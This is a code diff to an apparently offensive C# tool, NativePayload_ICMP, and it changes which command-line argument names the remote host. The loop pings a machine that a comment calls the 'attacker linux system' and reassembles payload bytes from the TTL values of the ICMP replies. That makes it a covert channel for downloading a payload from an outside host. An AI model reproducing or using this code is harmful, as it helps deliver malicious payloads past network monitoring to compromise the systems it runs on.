@@ -348,7 +348,7 @@ namespace NativePayload_ICMP
                     {
                         if (flag_end) break;
                         //// ping and sending ICMP Traffic to attacker linux system to Dump payloads by TTL response ;)
-                        string getcode = _Ping(args[0], 1);
+                        string getcode = _Ping(args[1], 1);
                         try
                         {
                             getcode = getcode.Remove(getcode.Length - 1, 1);
@@ -386,19 +386,19 @@ namespace NativePayload_ICMP
                                     Console.Write(" DATA[{0}] ", getcode.Substring(getcode.Length - 2, 2));
                                     Oonaggi += getcode.Substring(getcode.Length - 2, 2);
                                     Console.ForegroundColor = ConsoleColor.Green;
-                                    Console.WriteLine("from {0} final: {1}", args[0], getcode);
+                                    Console.WriteLine("from {0} final: {1}", args[1], getcode);
                                     Payload_counter++;
                                 }
                                 else if (init == false)
                                 {
                                     Console.ForegroundColor = ConsoleColor.DarkGreen;
-                                    Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
+                                    Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                                 }
                             }
                             else if (getcode == temp && getcode != "255")
                             {
                                 Console.ForegroundColor = ConsoleColor.DarkGreen;
-                                Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
+                                Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                             }
 
                             System.Threading.Thread.Sleep(1000);
@@ -408,7 +408,7 @@ namespace NativePayload_ICMP
                         {
                             flag_end_count++;
                             Console.ForegroundColor = ConsoleColor.DarkGreen;
-                            Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[0], getcode);
+                            Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
 
                             System.Threading.Thread.Sleep(500);
                             temp = getcode;
